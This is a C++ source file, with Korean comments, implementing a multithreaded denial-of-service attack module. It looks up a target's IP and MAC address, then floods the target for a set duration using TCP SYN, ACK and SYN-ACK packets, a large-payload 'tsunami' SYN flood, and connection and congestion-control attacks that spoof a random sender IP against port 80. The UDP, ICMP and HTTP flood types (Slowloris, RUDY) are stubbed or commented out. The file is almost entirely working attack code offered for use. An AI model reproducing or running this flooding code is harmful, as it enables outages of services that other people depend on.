#include "../lib/atkmod.h"

ATTACKMODULE::ATTACKMODULE(char* dev, std::string tip, int type, int speed, int dur){
    this->dev = dev;
    this->atktype = type;
    this->speed = speed;
    this->dur = dur;

    get_targetinfo(tip);
}

// target의 정보 받아오기 //
void ATTACKMODULE::get_targetinfo(std::string tip){
    
    /* get target ip */
    inet_pton(AF_INET, tip.c_str(), &target_ip);
    
    /* get target mac */
    PKT packet = PKT(dev);
    packet.set_pcap();
    packet.set_attackinfo(target_ip, target_mac);
}

void ATTACKMODULE::attack(){
    std::thread AttackThreads[THREADS];
    
    for(int i = 0; i < THREADS; i++){
        AttackThreads[i] = std::thread(&ATTACKMODULE::attack_routine, this);
    }
    
    for(int i = 0; i < THREADS; i++){
        AttackThreads[i].join();
    }
}

// TODO:make attack_routine function
void ATTACKMODULE::attack_routine(){

    PKT packet(dev);
    packet.set_pcap();

    /* dur동안 send packet하기 */
    struct timeval start, end, current;
    gettimeofday(&start, 0);
    end.tv_sec = start.tv_sec + dur;

    while(1){
        gettimeofday(&current, 0);
        if(current.tv_sec - end.tv_sec >= 0) break;
    
        switch(atktype){

            // TCP_SYN_ATTACK
            case 1:
                packet.make_packet(target_mac, target_ip, TCP, SYN, 0);
                break;
    
            // TCP_ACK_ATTACK
            case 2:
                packet.make_packet(target_mac, target_ip, TCP, ACK, 0);
                break;

            // TCP_SYN-ACK_ATTACK
            case 3:
                packet.make_packet(target_mac, target_ip, TCP, SYN_ACK, 0);
                break;
            
            // TCP_CONNECTION_ATTACK
            case 4:
                tcp_connection_attack(&packet, 0);
                break;

            // TCP_CONGESTION_CONTROL_ATTACK
            case 5:
                tcp_connection_attack(&packet, 1);
                break;

            // TCP_TSNAMI_ATTACK
            case 6:
                packet.make_packet(target_mac, target_ip, TCP, SYN, 1000);
                break;

            // UDP_ATTACK
            case 7:
                //packet.make_packet(tip, UDP, ?);
                break;

            // ICMP_ATTACK
            case 8:
                //packet.make_packet(tip, ICMP, ?);
                break;

            /*
            // GET_FLOODING_ATTACK
            case 9:

                break;

            // POST_FLOODING_ATTACK
            case 10:

                break;

            // DYNAMIC_HTTP_REQ_FLOODING
            case 11:

                break;

            // SLOWLORIS_ATTACK
            case 12:

                break;

            // SLOWREAD_ATTACK
            case 13:

                break;

            // R-U-D-Y_ATTACK
            case 14:

                break;

            // BIG1_ATTACK
            case 15:

            break;
            */
            default:
                printf("type error");
                break;
        }

    
        packet.send_packet();
    }
}


void ATTACKMODULE::tcp_connection_attack(PKT* packet, int ctrl)
{
    static int  isFirst = 1;

    static uint16_t  id = 0;
    static uint32_t  sender_ip = 0;
    static uint16_t  src_port = 0;
    static uint32_t  seq = 0;
    static uint32_t  ack = 0;
    static uint16_t  window = 0;

    // 처음이라면 랜덤 value
    if(isFirst)
    {
        fill_rand( (uint8_t*)&id,        sizeof(uint16_t) );
        fill_rand( (uint8_t*)&sender_ip, sizeof(uint32_t) );
        fill_rand( (uint8_t*)&src_port,  sizeof(uint16_t) );
        fill_rand( (uint8_t*)&seq,       sizeof(uint32_t) );
        
        if(ctrl)
            window = 1;
        else
            fill_rand( (uint8_t*)&window,    sizeof(uint16_t) );

        packet->make_specific_packet(
            target_mac,  /* target MAC */
            id,          /* id */
            sender_ip,   /* sender IP */
            target_ip,   /* target IP */
            src_port,    /* src port */
            80,          /* dst port */
            seq,         /* sequence number */
            ack,         /* acknowldge number */
            window,      /* window size */
            TCP,         /* packet type */
            SYN,         /* flag type */
            0            /* data length */
        );

        isFirst = 0;
    }

    else
    {
        id++;
        seq++;
        ack++;

        packet->make_specific_packet(
            target_mac,  /* target MAC */
            id,          /* id */
            sender_ip,   /* sender IP */
            target_ip,   /* target IP */
            src_port,    /* src port */
            80,          /* dst port */
            seq,         /* sequence number */
            ack,         /* acknowldge number */
            window,      /* window size */
            TCP,         /* packet type */
            ACK,         /* flag type */
            0            /* data length */
        );

        isFirst = 1;
    }
    
}